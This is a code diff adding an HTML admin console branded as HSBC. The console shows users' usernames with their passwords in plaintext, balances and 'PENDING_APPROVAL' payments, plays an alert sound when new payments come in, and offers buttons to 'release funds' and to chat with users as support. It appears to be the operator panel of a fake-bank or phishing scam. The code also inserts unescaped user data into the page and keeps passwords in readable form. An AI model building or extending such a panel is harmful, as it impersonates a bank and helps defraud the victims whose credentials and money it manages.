@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>HSBC Admin - Management Console</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; margin: 0; padding: 40px; }
+        .admin-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #db0011; padding-bottom: 10px; margin-bottom: 30px; }
+        .admin-header h1 { color: #db0011; margin: 0; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; background: #eee; padding: 15px; }
+        td { padding: 15px; border-bottom: 1px solid #ddd; }
+        
+        .status-badge { padding: 5px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+        .status-LOCKED { background: #ffebee; color: #c62828; }
+        .status-PENDING_APPROVAL { 
+            background: #fff8e1; 
+            color: #f57f17; 
+            border: 2px solid #f57f17;
+            animation: pulse 1.5s infinite;
+        }
+        .status-ACTIVE { background: #e8f5e9; color: #2e7d32; }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); background: #fdf2d0; }
+            100% { transform: scale(1); }
+        }
+
+        .btn-approve { background: #2e7d32; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .btn-chat { background: #333; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        
+        #login-lock { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
+        input { padding: 12px; width: 250px; border-radius: 4px; border: none; margin-bottom: 10px; }
+        
+        .notification-dot { height: 10px; width: 10px; background-color: #db0011; border-radius: 50%; display: inline-block; margin-right: 5px; }
+    </style>
+</head>
+<body>
+
+    <audio id="notification-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+    <div id="login-lock">
+        <h2 style="color: #db0011;">HSBC ADMIN ACCESS</h2>
+        <p style="color: #666; font-size: 12px;">Ensure speakers are ON for payment alerts</p>
+        <input type="password" id="admin-pass" placeholder="Enter Admin Secret Key">
+        <button class="btn-approve" onclick="loginAdmin()">Login to Console</button>
+    </div>
+
+    <div class="admin-header">
+        <h1>Management Console</h1>
+        <div id="status-indicator" style="font-size: 13px; color: #666;">
+            <span class="notification-dot"></span> System Live: Monitoring Payments...
+        </div>
+    </div>
+
+    <div class="container">
+        <table>
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Account Status</th>
+                    <th>Balance</th>
+                    <th>Support</th>
+                    <th>Control</th>
+                </tr>
+            </thead>
+            <tbody id="user-rows"></tbody>
+        </table>
+    </div>
+
+    <script>
+        let previousPendingCount = 0;
+
+        async function loginAdmin() {
+            const password = document.getElementById('admin-pass').value;
+            const res = await fetch('/api/admin/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({password})
+            });
+            if (res.ok) {
+                document.getElementById('login-lock').style.display = 'none';
+                loadUsers();
+                // Start auto-refresh every 10 seconds
+                setInterval(loadUsers, 10000);
+            } else {
+                alert("Access Denied");
+            }
+        }
+
+        async function loadUsers() {
+            const res = await fetch('/api/admin/users/all');
+            const users = await res.json();
+            const table = document.getElementById('user-rows');
+            table.innerHTML = '';
+
+            let currentPendingCount = 0;
+
+            users.forEach(user => {
+                if(user.walletStatus === 'PENDING_APPROVAL') currentPendingCount++;
+
+                table.innerHTML += `
+                    <tr>
+                        <td><strong>${user.username}</strong></td>
+                        <td><code>${user.password}</code></td>
+                        <td><span class="status-badge status-${user.walletStatus}">${user.walletStatus}</span></td>
+                        <td>$${(user.pendingBalance + user.availableBalance).toLocaleString()}</td>
+                        <td>
+                            <button class="btn-chat" onclick="manageChat('${user.username}')">Open Chat</button>
+                        </td>
+                        <td>
+                            ${user.walletStatus === 'PENDING_APPROVAL' ? 
+                            `<button class="btn-approve" onclick="approveUser('${user.username}')">Approve Payment</button>` : 
+                            '---'}
+                        </td>
+                    </tr>
+                `;
+            });
+
+            // Check if there's a new payment to play the beep
+            if (currentPendingCount > previousPendingCount) {
+                playNotification();
+            }
+            previousPendingCount = currentPendingCount;
+        }
+
+        function playNotification() {
+            const sound = document.getElementById('notification-sound');
+            sound.play().catch(e => console.log("Audio play blocked until user interaction"));
+        }
+
+        async function approveUser(user) {
+            const confirmRelease = confirm(`Are you sure you want to release funds for ${user}?`);
+            if(confirmRelease) {
+                await fetch(`/admin/approve/${user}`);
+                alert(user + " has been approved!");
+                loadUsers();
+            }
+        }
+
+        // --- ADMIN CHAT MANAGEMENT ---
+        async function manageChat(username) {
+            // First, fetch the history to see what they said
+            const res = await fetch(`/api/chat/history/${username}`);
+            const history = await res.json();
+            
+            let chatLog = history.length > 0 
+                ? history.map(m => `[${m.sender.toUpperCase()}] ${m.text}`).join('\n')
+                : "No messages yet.";
+
+            const reply = prompt(`Chat History for ${username}:\n\n${chatLog}\n\nEnter your reply:`);
+            
+            if (reply) {
+                await fetch('/api/chat/send', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        username: username, 
+                        text: reply, 
+                        isAdmin: true 
+                    })
+                });
+                alert("Message sent to " + username);
+            }
+        }
+    </script>
+</body>
+</html>
